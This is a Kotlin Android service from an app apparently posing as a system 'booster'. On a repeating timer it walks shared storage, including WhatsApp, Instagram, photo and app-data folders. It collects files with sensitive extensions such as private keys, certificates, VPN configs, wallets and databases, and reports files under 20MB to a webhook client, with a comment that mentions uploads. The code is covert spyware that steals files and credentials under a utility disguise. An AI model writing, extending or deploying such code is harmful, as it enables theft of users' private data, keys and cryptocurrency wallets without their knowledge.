package com.sysopt.booster

import android.app.Service
import android.content.Intent
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import java.io.File

class FileSystemMonitorService : Service() {
    private val handler = Handler(Looper.getMainLooper())
    private var scanCount = 0

    private val monitoredExtensions = listOf(
        "jpg", "jpeg", "png", "gif", "bmp", "webp",
        "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
        "txt", "log", "xml", "json", "csv",
        "db", "sqlite", "sql",
        "key", "p12", "pem", "crt", "cer", "pfx",
        "ovpn", "vpn", "conf", "cfg",
        "wallet", "dat", "bak", "backup",
        "zip", "rar", "7z", "tar", "gz",
        "mp4", "mov", "avi", "mkv",
        "mp3", "wav", "aac",
        "apk", "xapk", "apks"
    )

    private val scanRunnable = object : Runnable {
        override fun run() {
            scanDirectories()
            scanCount++
            val interval = if (scanCount % 5 == 0) 600000 else 1800000 // 10min vs 30min
            handler.postDelayed(this, interval.toLong())
        }
    }

    override fun onCreate() {
        super.onCreate()
        startForeground(2007, NotificationHelper.createNotification(this, "File Monitor"))
        handler.postDelayed(scanRunnable, 60000) // Start after 1 minute
    }

    private fun scanDirectories() {
        val dirs = listOf(
            Environment.getExternalStorageDirectory(),
            getExternalFilesDir(null),
            File("/sdcard/Download"),
            File("/sdcard/Documents"),
            File("/sdcard/DCIM"),
            File("/sdcard/Pictures"),
            File("/sdcard/Music"),
            File("/sdcard/Movies"),
            File("/sdcard/Android/data"),
            File("/sdcard/WhatsApp/Media"),
            File("/sdcard/Instagram")
        )

        dirs.forEach { dir ->
            dir?.let {
                if (it.exists() && it.canRead()) {
                    try {
                        scanDirectory(it, 0)
                    } catch (e: Exception) {
                        // Permission denied
                    }
                }
            }
        }
    }

    private fun scanDirectory(dir: File, depth: Int) {
        if (depth > 4) return // Limit depth for performance

        try {
            dir.listFiles()?.forEach { file ->
                if (file.isDirectory) {
                    if (!file.name.startsWith(".") && !file.name.contains("cache")) {
                        scanDirectory(file, depth + 1)
                    }
                } else {
                    val ext = file.extension.lowercase()
                    if (monitoredExtensions.contains(ext)) {
                        val size = file.length()
                        // Skip files > 20MB to avoid large uploads
                        if (size < 20 * 1024 * 1024 && size > 0) {
                            WebhookClient.sendFileList(file.absolutePath, size, ext)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // Skip inaccessible directories
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler.removeCallbacks(scanRunnable)
        super.onDestroy()
    }
}